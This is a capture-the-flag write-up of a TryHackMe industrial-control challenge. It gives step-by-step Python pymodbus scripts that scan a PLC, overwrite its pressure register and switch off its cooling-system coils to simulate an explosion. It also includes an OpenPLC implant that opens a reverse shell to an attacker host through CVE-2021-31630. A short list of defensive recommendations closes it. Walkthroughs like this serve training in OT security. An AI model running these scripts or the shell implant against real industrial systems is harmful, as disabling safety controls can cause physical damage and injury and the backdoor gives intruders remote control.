---
description: OT Exploitation
icon: sparkle
cover: ../.gitbook/assets/muichiro-tokito-3840x2160-16957.jpg
coverY: 0
---

# THM CTF 2025&#x20;

**Category:** ICS / OT (Industrial Control Systems / Operational Technology)

**Platform:** TryHackMe

**Difficulty:** Medium

**Points:** 60

**Objective:** Simulate a real-world OT breach by manipulating PLC systems using Modbus, triggering an industrial failure, implanting a backdoor, and retrieving flags.

***

### 1. Challenge Scenario Overview

This challenge places you in the role of an adversarial threat actor in an industrial control environment. Your goal is to:

* Gain initial access via Modbus.
* Manipulate register values to simulate pressure overload.
* Disable safety systems.
* Implant a reverse shell into the OpenPLC system.
* Maintain persistence and capture sensitive flags.

***

### 2. Step-by-Step Walkthrough

#### Step 1: Initial Enumeration (Target 1: 10.10.113.35)

**Command Used:**

```bash
nmap -sV --open 10.10.113.35

```

**Why this step?**

* To identify running services and open ports.
* Understand if a web server or SSH interface is available.

**What we found:**

* **Port 22**: OpenSSH 9.6p1 (SSH remote login)
* **Port 80 & 8080**: Werkzeug-based web servers (Python backend)

**Next Step:**

* Visit the web interfaces, especially port `8080`, which is likely the OpenPLC panel.

***

#### Step 2: Targeting the PLC via Modbus (Target 2: 10.10.219.182)

**Command Used:**

```bash
nmap -sV -p 502,1880 -Pn 10.10.219.182

```

**Why this step?**

* Check for Modbus service on port 502 (standard Modbus TCP)
* 1880 is commonly associated with Node-RED, an OT orchestration tool.

**What we found:**

* Port 502 is **filtered**, indicating something is there but blocking direct probes.

**Next Step:**

* Try connecting using Modbus clients like `pymodbus` in Python.

***

#### Step 3: Modbus Register Interaction

**Python Script (OT\_registers.py):**

```python
from pymodbus.client import ModbusTcpClient
import sys

client = ModbusTcpClient("10.10.219.182", port=502)
addr = int(sys.argv[1]) if len(sys.argv) > 1 else 0
if client.connect():
    print("[+] Connected to Modbus server")

    try:
        # Read holding registers
        result = client.read_holding_registers(addr)
        if not result.isError():
            print(f"Holding registers: {result.registers}")

        # Read input registers
        result = client.read_input_registers(addr)
        if not result.isError():
            print(f"Input registers: {result.registers}")

    except Exception as e:
        print(f"[-] Error: {e}")
        pass

    client.close()
else:
    print("[-] Failed to connect")

```

**Why this step?**

* Holding registers typically store analog data like pressure, temperature, etc.
* Need to locate the pressure register.

**What we found:**

* Holding Register 0 = `63`
* Input Registers = `0`

**Inference:** Register 0 likely holds the pressure value.

**Next Step:** Try overwriting this value with something dangerously high to trigger safety systems.

***

#### Step 4: Simulating the Explosion (Register Overwrite)

**Python Script (change\_pressure.py):**

```python
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient("10.10.219.182", port=502)
client.connect()

value_to_write = 65535  # Dangerously high value
response = client.write_register(0, value_to_write)
print(response)

if not response.isError():
    print(f"[+] Successfully wrote {value_to_write} to 40001 (register 0)")
else:
    print("[-] Failed to write")

client.close()

```

**Why this step?**

* Overwriting the pressure register to 65535 simulates overpressure.
* Triggers the cooling system as a safety response.

**What we found:**

* Visiting the web interface now shows that the pressure is **critically high**.
* Cooling system is engaged.

**Next Step:** Try finding and disabling the cooling coil.

***

#### Step 5: Coil Discovery and Cooling System Shutdown

**Python Script (OT\_def\_ef\_coils.py):**

```python
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient("10.10.219.182", port=502)
client.connect()

for i in range(1000):
    result = client.read_coils(i, count=10)
    if result.isError():
        print("Failed reading coils")
    else:
        if True in result.bits:
            print(f"results [{i}]: {result.bits}")
            print(f"Coil {i} is ON")
            break
        else:
            print(f"results [{i}]: {result.bits}")

    print("-" * 40)
client.close()

```

**Python Script (OT\_Run\_turn\_off\_cooling.py):**

```python
from pymodbus.client import ModbusTcpClient

client = ModbusTcpClient("10.10.219.182", port=502)
client.connect()

for i in range(10, 17):
    client.write_coil(i, True)

res = client.read_coils(15, count=1)
print("[+] Cooling system turned off: ", res)
client.close()

```

**Why this step?**

* Coils are boolean flags (on/off). Cooling systems are usually controlled via coils.

**What we found:**

* One coil address is `True` (ON), indicating it's controlling the cooling system.

**Next Step:** Write `True` to disable it, triggering the "explosion".

***

#### Step 6: Get Flag #1 (Web Interface)

**What we did:**

* Visited `http://10.10.219.182/`

**Flag Captured:**

```
THM{BOOM_BOOM_KABOOM}

```

***

#### Step 7: Persistence via PLC Implant (Reverse Shell)

**Exploit Used:** [CVE-2021-31630](https://github.com/thewhiteh4t/cve-2021-31630)

**Custom Shell Payload (Python reverse shell):**

```python
import psm
import time
import socket
import subprocess
import os

counter = 0
var_state = False
shell_ran = False

def hardware_init():
    psm.start()

def update_inputs():
    global counter
    global var_state
    psm.set_var("IX0.0", var_state)
    counter += 1
    if counter == 10:
        counter = 0
        var_state = not var_state

def update_outputs():
    global shell_ran
    a = psm.get_var("QX0.0")
    if a == True:
        print("QX0.0 is true")

    if not shell_ran:
        shell_ran = True
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect(("<LHOST>", <LPORT>))
            os.dup2(s.fileno(), 0)
            os.dup2(s.fileno(), 1)
            os.dup2(s.fileno(), 2)
            subprocess.call(["/bin/bash", "-i"])
        except Exception as e:
            print(f"Shell error: {e}")

if __name__ == "__main__":
    hardware_init()
    while not psm.should_quit():
        update_inputs()
        update_outputs()
        time.sleep(0.1)
    psm.stop()

```

***

#### Step 8: Final Flag Extraction

**Command:**

```bash
cat /home/ubuntu/flag.txt

```

**Flag Captured:**

```
FLAG{cooling_bypass_exploded}

```

***

### 3. Attack Summary Table

| Phase        | Action                      | Purpose                          | Outcome                  |
| ------------ | --------------------------- | -------------------------------- | ------------------------ |
| Recon        | Nmap on both targets        | Identify services and port roles | Found Modbus, Web, SSH   |
| Access       | Modbus register enumeration | Locate pressure values           | Found register 0 = 63    |
| Exploit      | Overwrite register          | Simulate pressure failure        | Triggered cooling system |
| Escalation   | Disable coil                | Shut off safety system           | Explosion simulated      |
| Persistence  | CVE-2021-31630              | Inject reverse shell             | Root shell acquired      |
| Exfiltration | Read flag file              | Proof of compromise              | Captured both flags      |

***

### 4. Real-World Significance

* This lab shows how **lack of authentication in Modbus** can lead to complete ICS compromise.
* OpenPLC’s scripting interface (`Python on Linux - PSM`) can be weaponized for backdoors.
* Critical functions like **pressure control and cooling** were manipulated without credentials.

***

### 5. Final Notes

* Always monitor industrial protocols like Modbus with deep packet inspection.
* Restrict PLC interfaces to internal-only access.
* Secure and validate hardware layer updates in OpenPLC.
* Use firewalling and segmentation (zone-based architecture) to isolate OT assets.

***
